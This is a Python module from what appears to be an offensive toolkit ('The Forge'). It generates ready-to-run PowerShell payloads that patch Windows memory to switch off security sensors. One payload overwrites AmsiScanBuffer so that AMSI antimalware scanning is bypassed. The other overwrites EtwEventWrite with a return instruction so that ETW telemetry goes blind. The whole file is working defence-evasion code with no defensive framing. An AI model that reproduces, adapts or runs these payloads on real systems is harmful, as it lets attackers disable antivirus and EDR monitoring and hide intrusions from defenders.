"""
The Forge — Evasion & Stealth
Memory patching implants to blind AV/EDR sensors (AMSI & ETW).
"""

import textwrap

def generate_powershell_amsi() -> str:
    """PowerShell payload to memory patch AmsiScanBuffer (bypasses AMSI)."""
    code = textwrap.dedent("""\
        $MemPvt=@"
        using System;
        using System.Runtime.InteropServices;
        public class Win32 {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
        "@
        Add-Type -TypeDefinition $MemPvt
        
        $AmsiDll=[Win32]::LoadLibrary("amsi.dll")
        $AmsiScanBuffer=[Win32]::GetProcAddress($AmsiDll,"AmsiScanBuffer")
        
        $OldProtect=0
        [Win32]::VirtualProtect($AmsiScanBuffer,[uint32]5,0x40,[ref]$OldProtect) | Out-Null
        
        # Patching instruction: mov eax, 0x80070057; ret (AMSI_RESULT_INVALID_ARG)
        $Patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3) 
        [System.Runtime.InteropServices.Marshal]::Copy($Patch,0,$AmsiScanBuffer,$Patch.Length)
        
        [Win32]::VirtualProtect($AmsiScanBuffer,[uint32]5,$OldProtect,[ref]$OldProtect) | Out-Null
        Write-Host "[+] AMSI Blinded."
    """)
    return code


def generate_powershell_etw() -> str:
    """PowerShell payload to memory patch EtwEventWrite (blinds ETW telemetry)."""
    code = textwrap.dedent("""\
        $MemPvt=@"
        using System;
        using System.Runtime.InteropServices;
        public class Win32 {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
        "@
        Add-Type -TypeDefinition $MemPvt
        
        $Ntdll=[Win32]::LoadLibrary("ntdll.dll")
        $EtwEventWrite=[Win32]::GetProcAddress($Ntdll,"EtwEventWrite")
        
        $OldProtect=0
        [Win32]::VirtualProtect($EtwEventWrite,[uint32]1,0x40,[ref]$OldProtect) | Out-Null
        
        # Patching instruction: ret (0xc3)
        $Patch=[Byte[]](0xC3) 
        [System.Runtime.InteropServices.Marshal]::Copy($Patch,0,$EtwEventWrite,$Patch.Length)
        
        [Win32]::VirtualProtect($EtwEventWrite,[uint32]1,$OldProtect,[ref]$OldProtect) | Out-Null
        Write-Host "[+] ETW Blinded."
    """)
    return code


VARIANTS = {
    "ps_amsi": generate_powershell_amsi,
    "ps_etw": generate_powershell_etw,
}

def generate(language: str = "ps_amsi", **kwargs) -> str:
    gen_func = VARIANTS.get(language.lower())
    if not gen_func:
        raise ValueError(f"Unknown variant: {language}.")
    return gen_func(**kwargs)

def list_variants() -> list[str]:
    return list(VARIANTS.keys())
